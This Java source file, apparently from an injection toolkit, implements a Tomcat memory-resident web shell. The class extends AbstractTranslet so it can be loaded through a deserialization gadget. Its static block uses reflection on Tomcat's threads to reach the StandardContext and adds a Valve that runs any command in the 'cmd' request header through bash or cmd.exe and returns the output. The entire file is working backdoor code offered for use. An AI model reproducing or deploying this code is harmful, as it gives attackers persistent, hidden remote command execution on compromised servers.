package net.roboterh.injector.templates;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.ApplicationFilterChain;
import org.apache.catalina.valves.ValveBase;

import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.List;
import java.util.Scanner;

import org.apache.catalina.core.StandardContext;
import org.apache.coyote.RequestInfo;

public class TomcatValve extends AbstractTranslet {
    static {
        try {
            String cmdHeader = "cmd";

            boolean flag = false;
            Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(),"threads");
            for (int i=0;i<threads.length;i++){
                Thread thread = threads[i];
                if (thread != null){
                    String threadName = thread.getName();
                    if (!threadName.contains("exec") && threadName.contains("http")){
                        Object target = getField(thread,"target");
                        Object global = null;
                        if (target instanceof Runnable){
                            // 需要遍历其中的 this$0/handler/global
                            // 需要进行异常捕获，因为存在找不到的情况
                            try {
                                global = getField(getField(getField(target,"this$0"),"handler"),"global");
                            } catch (NoSuchFieldException fieldException){
                                fieldException.printStackTrace();
                            }
                        }
                        // 如果成功找到了 我们的 global ，我们就从里面获取我们的 processors
                        if (global != null){
                            List processors = (List) getField(global,"processors");
                            for (i=0;i<processors.size();i++){
                                RequestInfo requestInfo = (RequestInfo) processors.get(i);
                                if (requestInfo != null){
                                    org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) getField(requestInfo,"req");
                                    org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) tempRequest.getNote(1);
                                    Response response = request.getResponse();

                                    ServletContext servletContext = request.getServletContext();
                                    StandardContext o = null;
                                    //循环获取 StandardContext对象
                                    while (o == null) {
                                        Field context = servletContext.getClass().getDeclaredField("context");
                                        context.setAccessible(true);
                                        Object object = context.get(servletContext);

                                        if (object instanceof ServletContext) {
                                            servletContext = (ServletContext) object;
                                        } else if (object instanceof StandardContext) {
                                            o = (StandardContext) object;
                                        }
                                    }
                                    // 添加自定义的Valve
//                                    EvilValve evilValve = new EvilValve("aaa");
                                    o.getPipeline().addValve(new ValveBase() {
                                        @Override
                                        public void invoke(Request request, Response response) throws IOException, ServletException {
                                            String cmd = request.getHeader(cmdHeader);
                                            if (cmd != null) {
                                                try {
                                                    java.io.PrintWriter printWriter = response.getWriter();
                                                    ProcessBuilder processBuilder;
                                                    String o = "";
                                                    if (System.getProperty("os.name").toLowerCase().contains("win")) {
                                                        processBuilder = new ProcessBuilder(new String[]{"cmd.exe", "/c", cmd});
                                                    } else {
                                                        processBuilder = new ProcessBuilder(new String[]{"/bin/bash", "-c", cmd});
                                                    }
                                                    java.util.Scanner scanner = new Scanner(processBuilder.start().getInputStream()).useDelimiter("\\A");
                                                    o = scanner.hasNext() ? scanner.next() : o;
                                                    scanner.close();
                                                    printWriter.println(o);
                                                    printWriter.flush();
                                                    printWriter.close();
                                                } catch (Exception e) {
                                                    e.printStackTrace();
                                                }
                                            }
                                        }
                                    });
                                }
                            }
                        }
                    }
                }
                if (flag){
                    break;
                }
            }
        } catch (Exception e){
            e.printStackTrace();
        }

    }

    public static Object getField(Object obj,String fieldName) throws Exception{
        Field f0 = null;
        Class clas = obj.getClass();

        while (clas != Object.class){
            try {
                f0 = clas.getDeclaredField(fieldName);
                break;
            } catch (NoSuchFieldException e){
                clas = clas.getSuperclass();
            }
        }

        if (f0 != null){
            f0.setAccessible(true);
            return f0.get(obj);
        }else {
            throw new NoSuchFieldException(fieldName);
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}